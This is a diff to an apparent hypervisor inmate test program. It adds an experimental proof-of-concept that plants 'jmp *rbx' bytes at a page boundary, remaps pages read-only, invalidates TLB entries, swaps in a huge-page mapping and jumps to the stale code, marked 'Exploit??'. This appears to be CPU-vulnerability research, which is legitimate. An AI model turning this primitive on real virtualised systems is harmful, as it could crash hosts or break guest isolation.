@@ -104,6 +104,11 @@ static void pollute_cache(char *mem)
 		mem[n] ^= 0xAA;
 }
 
+static inline void invlpg(void *address)
+{
+	asm volatile("invlpg (%0)" :: "r"(address) : "memory");
+}
+
 void inmate_main(void)
 {
 	bool allow_terminate = false;
@@ -125,6 +130,51 @@ void inmate_main(void)
 		initial_smis = (u32)read_msr(MSR_SMI_COUNT);
 		printk("Initial number of SMIs: %d\n", initial_smis);
 	}
+
+	unsigned char *hmem = (void*)0x200000;
+	unsigned char *victim = (void*)(0x200000 + PAGE_SIZE - 1);
+	printk("Mapping some mem\n");
+
+	/* Step 1: Place the victim code */
+	/* Map two huge pages */
+	map_range_4k(hmem, PAGE_SIZE, PG_RW, MAP_CACHED);
+	map_range_4k(hmem + PAGE_SIZE, PAGE_SIZE, PG_RW, MAP_CACHED);
+	/* copy jmp *rbx to page boundary */
+	victim[0] = 0xff; // jmp *rbx
+	victim[1] = 0xe3;
+
+	/* Step 2: From now on, remap pages RO */
+	map_range_4k(hmem, PAGE_SIZE, 0, MAP_CACHED);
+	map_range_4k(hmem + PAGE_SIZE, PAGE_SIZE, 0, MAP_CACHED);
+	asm volatile("mfence" ::: "memory");
+
+	/* Step 3: We need to invlpg to propagate the change to RO */
+	invlpg(hmem);
+	invlpg(hmem + PAGE_SIZE);
+
+	/* Step 4: Execute the victim */
+	asm volatile("jmp %%rax\n\t" : : "a"(victim), "b"(0x121f));
+
+	/* 0xff 0xe3 should now be cached */
+
+	/* just a jmpback reference */
+	asm volatile("nop");
+
+	/* Step 6: Ensure that there's a iTLB miss */
+	invlpg(hmem + PAGE_SIZE);
+	invlpg(hmem);
+
+	/* Step 5: Overwrite PT entries with a huge page */
+	map_range(hmem, HUGE_PAGE_SIZE, 0, MAP_CACHED);
+
+	/* Step 7: Exploit?? */
+	asm volatile("jmp %%rax\n\t" : : "a"(victim), "b"(0x1245));
+
+	/* second jmpback reference, 120f */
+	asm volatile("nop");
+	printk("Welcome back again\n");
+
+	for(;;);
 
 	tsc_freq = tsc_init();
 	printk("Calibrated TSC frequency: %lu.%03lu kHz\n", tsc_freq / 1000,
